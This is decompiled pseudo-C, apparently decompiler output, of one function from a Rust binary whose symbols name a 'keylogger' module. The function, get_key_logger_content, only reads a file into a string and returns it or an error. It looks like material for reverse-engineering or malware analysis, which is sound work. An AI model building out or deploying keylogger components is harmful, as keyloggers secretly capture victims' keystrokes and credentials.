long long flealib::keylogger::get_key_logger_content(struct_0 *a0, unsigned long long a1)
{
    unsigned long long v0;  // [bp-0x28]
    char v1;  // [bp-0x20], Other Possible Types: unsigned long long
    unsigned long long v2;  // [bp-0x18]
    char v3;  // [bp-0x10]

    std::fs::read_to_string(&v1, a1);
    if ((char)(((0 ^ v1) & (0 ^ -(v1))) >> 63))
    {
        v0 = v2;
        a0.spec_to_string(&v0);
        ::0x7a1b60::core::ptr::drop_in_place<std::io::error::Error>(&v0);
    }
    else
    {
        a0->field_10 = *((long long *)&v3);
        a0->field_0 = *((int128_t *)&v1);
    }
    return a0;
}
